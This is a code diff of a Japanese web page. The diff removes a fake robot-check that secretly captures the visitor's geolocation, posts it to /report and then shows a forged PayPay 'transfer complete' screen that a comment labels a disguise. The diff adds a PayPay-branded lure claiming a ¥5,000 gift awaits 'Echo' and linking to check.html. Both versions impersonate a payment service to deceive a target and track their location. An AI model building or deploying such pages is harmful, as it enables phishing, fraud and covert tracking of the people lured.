@@ -2,67 +2,39 @@
 <html lang="ja">
 <head>
   <meta charset="UTF-8">
-  <title>ロボット確認</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPayギフト</title>
   <style>
     body {
-      text-align: center;
-      margin-top: 100px;
       font-family: sans-serif;
+      background: #f7f7f7;
+      text-align: center;
+      padding: 50px;
     }
-    #robot-message {
-      display: none;
+    .box {
+      background: white;
+      border-radius: 12px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+      padding: 30px;
+      max-width: 400px;
+      margin: auto;
     }
-    #main-content {
-      display: block;
+    button {
+      background-color: #e60012;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      margin-top: 20px;
     }
   </style>
 </head>
 <body>
-  <div id="robot-message">
-    <h2>ロボットと判明したため、このサービスはご利用いただけません。</h2>
+  <div class="box">
+    <h2>PayPayギフト</h2>
+    <p>Echo様に ¥5,000 のギフトが届いています</p>
+    <button onclick="location.href='check.html'">受け取る</button>
   </div>
-
-  <div id="main-content">
-    <h2>ロボットでないことを確認してください</h2>
-    <input type="checkbox" id="check">
-    <label for="check">私はロボットではありません</label>
-  </div>
-
-  <script>
-    if (localStorage.getItem('robot') === 'true') {
-      document.getElementById('main-content').style.display = 'none';
-      document.getElementById('robot-message').style.display = 'block';
-    } else {
-      document.getElementById('check').addEventListener('change', () => {
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(pos => {
-            fetch('/report', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                latitude: pos.coords.latitude,
-                longitude: pos.coords.longitude
-              })
-            }).then(() => {
-              // ✅ PayPay風の完了画面へ遷移（偽装）
-              document.body.innerHTML = `
-                <img src="https://www.paypay.ne.jp/img/logo.svg" width="150"><br><br>
-                <h2>送金が完了しました</h2>
-                <p>ありがとうございました。</p>
-              `;
-            });
-          }, err => {
-            alert('位置情報が取得できませんでした。');
-            localStorage.setItem('robot', 'true');
-            location.reload();
-          });
-        } else {
-          alert('このブラウザでは位置情報が使用できません。');
-          localStorage.setItem('robot', 'true');
-          location.reload();
-        }
-      });
-    }
-  </script>
 </body>
 </html>
